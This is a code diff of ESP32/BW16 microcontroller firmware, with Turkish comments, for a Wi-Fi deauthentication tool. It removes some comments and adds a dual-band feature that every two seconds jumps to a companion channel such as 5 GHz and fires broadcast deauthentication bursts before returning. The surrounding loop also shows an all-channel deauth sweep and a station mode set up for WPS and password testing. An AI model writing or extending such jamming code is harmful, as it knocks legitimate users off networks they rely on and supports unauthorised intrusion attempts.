@@ -13,11 +13,12 @@
 #endif
 
 int curr_channel       = 1;
-int curr_5ghz_idx      = 0;   // BW16: 5GHz kanal dizisinde konum
-bool sweep_5ghz        = false; // BW16: şu an 5GHz taramasında mı
+int curr_5ghz_idx      = 0;
+bool sweep_5ghz        = false;
 
-static unsigned long last_csa_send = 0;
-static unsigned long last_retrack  = 0;
+static unsigned long last_csa_send        = 0;
+static unsigned long last_retrack         = 0;
+static unsigned long last_companion_burst = 0;  // Çift bant burst zamanlayıcısı
 
 // ─── Maks Performans ─────────────────────────────────────────────────────────
 void apply_max_performance() {
@@ -44,7 +45,6 @@ static void on_wifi_event(WiFiEvent_t event) {
 #endif
 
 // ─── BW16: bir sonraki tarama kanalına geç ───────────────────────────────────
-// 2.4 GHz (1-13) ve 5 GHz kanalları sırayla taranır.
 static void bw16_advance_channel() {
 #ifdef BOARD_BW16
   if (!sweep_5ghz) {
@@ -77,20 +77,14 @@ void setup() {
 #endif
 
   passwords_init();
-
-  // Ağır tek-seferlik donanım başlatma
   hal_hw_init();
 
 #ifndef BOARD_BW16
-  // ESP32: WiFi olaylarına abone ol
   WiFi.onEvent(on_wifi_event);
 #endif
 
-  // APSTA modunda başla — AP hiç kapanmaz, STA WPS/şifre testi için hazır
   WiFi.mode(WIFI_MODE_APSTA);
   WiFi.softAP(AP_SSID, AP_PASS);
-
-  // softAP TX gücünü sıfırlayabilir — hemen geri uygula
   apply_max_performance();
 
   start_web_interface();
@@ -106,8 +100,6 @@ void loop() {
   reapply_wifi_power();
 
   if (deauth_type == DEAUTH_TYPE_ALL) {
-    // BW16: 2.4 + 5 GHz kanalları sırayla tara
-    // ESP32: yalnızca 2.4 GHz kanalları
 #ifdef BOARD_BW16
     bw16_advance_channel();
 #else
@@ -182,6 +174,13 @@ void loop() {
       if (now - last_retrack >= RETRACK_INTERVAL_MS) {
         last_retrack = now;
         retrack_deauth_target();
+      }
+      // ── Çift bant: eşlikçi kanala periyodik deauth patlaması ──────────────
+      // Her 2 saniyede bir eşlikçi kanalına (örn. 5GHz) atlar, broadcast
+      // deauth patlatır ve birincil kanala geri döner.
+      if (deauth_has_companion && now - last_companion_burst >= 2000) {
+        last_companion_burst = now;
+        send_companion_deauth_burst();
       }
     }
   }
